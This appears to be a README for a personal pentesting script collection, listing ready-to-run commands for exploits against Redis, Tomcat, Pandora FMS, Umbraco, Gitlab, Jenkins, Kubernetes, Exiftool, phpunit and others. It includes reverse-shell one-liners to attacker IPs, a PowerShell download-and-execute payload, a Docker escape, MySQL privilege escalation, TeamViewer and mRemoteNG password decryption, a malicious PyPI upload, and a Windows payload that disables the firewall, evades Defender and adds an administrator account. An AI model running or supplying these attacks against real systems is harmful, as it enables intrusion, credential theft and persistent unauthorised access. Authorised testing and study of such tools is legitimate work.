## Collection of scripts for pentesting

### Testing Redis for RCE
```
python3 redis.py -i <IP> -p <PORT>
```

### Generating .war files for creating reverse shell on Apache Tomcat
```
python3 war/war.py -i <IP Address of reverse shell> -p <Port Number of reverse shell>
```
The exploit.war file will be created at /war/war directory, and can then be uploaded to the Apache Tomcat server via the following curl command

```
curl --upload-file /war/war/exploit.war -u '<username>:<password>' "http://<Apache Tomcat site>:8080/manager/text/deploy?path=/exploit"
```
Visiting ```http://<Apache Tomcat site>:8080/exploit``` will then trigger the reverse shell.

### gdbserver to rce

```
gdb -x gdb.py
```

References: \
https://blog.orange.tw/2015/08/remote-code-execution-on-gdb-remote.html \
http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/ \
http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/ 

### Remote command execution on James Adminstration tool 2.3.2
This exploit code was taken and edited from [exploitdb](https://www.exploit-db.com/exploits/35513]0> For this exploit to work, we would need to run the exploit code and a user has to login to the SSH terminal in his account. 

NOTE: We may need to modify the port numbers in the script addordingly.
```
python3 james.py <IP Address>
```

### Decrypt mremoteNG passwords
Decrypt passwords obtained from confCons.xml from mremoteNG

```
python3 decrypt_mremoteng.py -f <filename> -p <password, default is "mR3m">
```

### Exploiting Pandora FMS v7.0NG.742_FIX_PERL2020
Exploit SQL Injection(CVE-2021-32099) in Pandora FMS to gain authenticated access and afterwards, exploit file upload vulnerabilities to spawn a reverse shell

```
python3 pandora.py -u <url of Pandora FMS> -i <IP Address of listening shell> -p <Port of listening shell>
```

### Umbraco Authenticated RCE
Authenticated RCE for Umbraco

```
python3 umbraco_rce.py -u <username> -p <password> -i <url> -c "powershell.exe" -a "IEX (New-Object Net.WebClient).downloadString('http://XX.XX.XX.XX/shell.ps1')"
```

### Decrypting registry keys for TeamViewer (<Version 9)
Decryption of registry keys that are lower than version 9. To obtain the registry keys, first navigate to HKLM:\software\wow6432node\teamviewer\version7. Afterwards, get any of the following keys
- (get-itemproperty -path .).OptionsPasswordAES
- (get-itemproperty -path .).SecurityPasswordAES
- (get-itemproperty -path .).SecurityPasswordExported
- (get-itemproperty -path .).ServerPasswordAES
- (get-itemproperty -path .).ProxyPasswordAES
- (get-itemproperty -path .).LicenseKeyAES

NOTE: We will need to modify the ciphertext values in the ```teamviewer_decrypt.py``` to decrypt the password that we want.

```
python3 teamviewer_decrypt.py
```

### Gitlab RCE
Exploiting CVE-2018-19585 and CVE-2018-19571 to obtain remote code execution
```
python3 gitlab_rce -u "<Gitlab username>" -p "<Gitlab password>" -l <gitlab site>" -c "<command>"
```

### Docker container escape by exploiting cgroups
This only works if we are able to find and enable a cgroup release-agent. To check if it is exploitable, we can run the commands below and check if there is an output
```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
echo $d
```
To execute the exploit:
```
chmod +x cgroups_escape.sh
./cgroups_escape.sh
```

### Exiftool RCE
Exploiting CVE-2021-22204 to generate a malicious image that can be used to create a reverse shell payload. However, take note that the configfile and an image has to be present for the exploit to work

```
python3 exiftool.py -i <IP Address of reverse shell listener> -p <Port of reverse shell listener> -f <Image file to be exploited>
```

### phpunit RCE
Exploiting CVE-2017-9841 on publicly-exposed /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php page for PHPUnit before 4.8.28 and 5.x before 5.6.3 allows an attacker to execute arbitary PHP code

```
python3 CVE-2017-9841.py -u http://store.djewelry.htb -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/4000 0>&1'"
```

### Let's Chat Enumeration
Enumeration of an exposed let's chat web service to obtain information such as current user, list of users, list of chat rooms and list of messages using an exposed token

```
python3 lets_chat_enum.py -u <url of let's chat> -t <let's chat token>
```

### Uploading a malicious pypi package onto the pypi server

```
mv pypi_exploit/.pypirc ~/.pypirc
python3 setup.py sdist upload -r pypi_exploit
```

### Exploiting groovy scripts on Jenkins website
- For this to be exploited, we would need to have public access to ```<base url>/script```
- Apart from that, we would also need to know the value of the ```Jenkins-Crumb```. The ```Jenkins-Crumb``` is used as a CSRF token to prevent CSRF attacks on the Jenkins website. In most cases, this value is hardcoded and can be obtained by inspecting the source code of the website.
- ```jenkins_reverse.py``` script creates a reverse shell connection to the specified IP address and port of the reverse shell listener, while the ```jenkins_rce.py``` script executes arbitary commands on the backend of the server and prints out the output to the attacker

```
python3 jenkins_reverse.py -u "<base url of Jenkins website>" -c "<Jenkins-Crumb>" -i "<LHOST>" -p "<LPORT>"
python3 jenkins_rce.py -u <base url of Jenkins website> -cr <Jenkins-Crumb> -c "<Command to be executed>" 
```

### Exploiting Exposed Kubernetes port/url
- Enumerate running namespaces, pods and containers
- Check for rce and provide ```curl``` command for exploiting rce
- Check for extractable service account tokens and provide ```curl``` token to extract the service account credentials

```
python3 kubelet.py --url https://<url>:<port>
```

### Exploiting MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit
- Need to know a valid MySQL account
- After executing the python script, it will create a /tmp/sh binary with SUID bits. We can only get privilege escalation by executing ```/tmp/sh -p```

Credits: https://github.com/d7x/udf_root

```
// Note please use python instead of python3
python udf_root.py --username <username> --password <password>
```

### Advanced Comment System 1.0 RCE

LFI to RCE for Advanced Comment System 1.0

```
python3 advanced-comment-system-rce.py "ls -la"
// reverse shell
python3 advanced-comment-system-rce.py "bash -i >& /dev/tcp/<IP Address>/<Port> 0>&1"
```

### Generating custom Windows reverse shell payload
Payload to:
- Disable firewall
- Evade Windows Defender's detection as malware
- Add a new user and is able to rdp in (optional)

First, we will need to generate the binaries using the following command:
```
./windows/payloads/exploit.sh <IP Address> <Web Port> <Rev Shell Port>
```

Afterwards, we will have to start up a local web listener and a local reverse shell listener
```
python3 -m http.server <web port>
nc -nlvp <reverse shell port>
```
Uploading the ```payload.exe``` to the target server and executing it will then spawn a reverse shell connection

#### Sanity Test:
To do a sanity test, we can start up our wireshark and check for ICMP connections. The binaries does ```ping``` commands to our local server which can then be captured
as ICMP packages using wireshark

#### Adding new user and rdp in
- NOTE: This only works if port 3389 is open

To modify the binary to add a new user and rdp in, uncomment the following lines in the ```sample.c``` source code. This creates a new ```test``` user with password as ```A123456789bc```

```
i = system ("cmd /c net user test A123456789bc /add");
i = system ("cmd /c net localgroup administrators test /add");
```

We can then rdp in with the new user with the following command

```
rdesktop -u test -p A123456789bc <IP Address>
```
References: https://medium.com/@minix9800/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623

### OTRS 5.0x/6.0x Remote Code Execution

```
python3 otrs_exploit.py --url <base uri> --username <username> --password <password> --ip <IP of local listener> --port <Port of local listener>
```

References:
- https://www.exploit-db.com/exploits/49794
- https://www.exploit-db.com/exploits/43853
